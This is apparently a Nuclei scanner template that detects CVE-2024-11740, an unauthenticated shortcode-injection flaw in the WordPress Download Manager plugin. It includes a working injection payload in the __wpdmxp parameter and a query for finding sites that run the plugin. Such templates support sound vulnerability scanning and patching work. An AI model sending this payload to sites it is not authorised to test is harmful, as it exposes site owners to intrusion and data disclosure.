id: CVE-2024-11740

info:
  name: Download Manager < 3.3.04 - Unauthenticated Arbitrary Shortcode Execution
  author: iamnoooob,rootxharsh,pdresearch
  severity: high
  description: |
    The The Download Manager plugin for WordPress is vulnerable to arbitrary shortcode execution in all versions up to, and including, 3.3.03. This is due to the software allowing users to execute an action that does not properly validate a value before running do_shortcode. This makes it possible for unauthenticated attackers to execute arbitrary shortcodes.
  impact: |
    Unauthenticated attackers can execute arbitrary shortcodes which may expose sensitive information or perform unauthorized actions.
  remediation: |
    Update Download Manager plugin to version 3.3.04 or later.
  reference:
    - https://github.com/advisories/GHSA-cq39-wq4r-hjrj
    - https://plugins.trac.wordpress.org/browser/download-manager/tags/3.3.02/src/Package/Hooks.php#L42
    - https://plugins.trac.wordpress.org/browser/download-manager/tags/3.3.02/src/Package/views/shortcode-iframe.php#L203
    - https://www.wordfence.com/threat-intel/vulnerabilities/id/4a7be578-5883-4cd3-963d-bf81c3af2003?source=cve
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L
    cvss-score: 7.3
    cve-id: CVE-2024-11740
    cwe-id: CWE-94
    epss-score: 0.08924
    epss-percentile: 0.92424
    cpe: cpe:2.3:a:wpdownloadmanager:download_manager:*:*:*:*:*:wordpress:*:*
  metadata:
    verified: true
    max-request: 1
    vendor: wpdownloadmanager
    product: download_manager
    framework: wordpress
    publicwww-query: "/wp-content/plugins/download-manager/"
  tags: cve,cve2024,wordpress,wp-plugin,download-manager,short-code,wp,vkev,vuln

http:
  - raw:
      - |
        GET /?__wpdmxp=%27][/wpdm_package][wpdm_all_packages][wpdm_package%20id=%27 HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - '"wpdm-all-packages"'
          - 'wpdm-download-link download-on-click'
        condition: and

      - type: word
        part: body
        words:
          - 'No Packages Found'
        negative: true
# digest: 4b0a00483046022100d6889045ba31448ff4792020f4e94b86a948d927951159c2b3c1ebd1c8fd8a4f022100bdfb1b1d86b9f40e7c95a57f69b302ca6b99e1bc91b3413651e22c3042b29c59:922c64590222798bb761d5b6d8e72950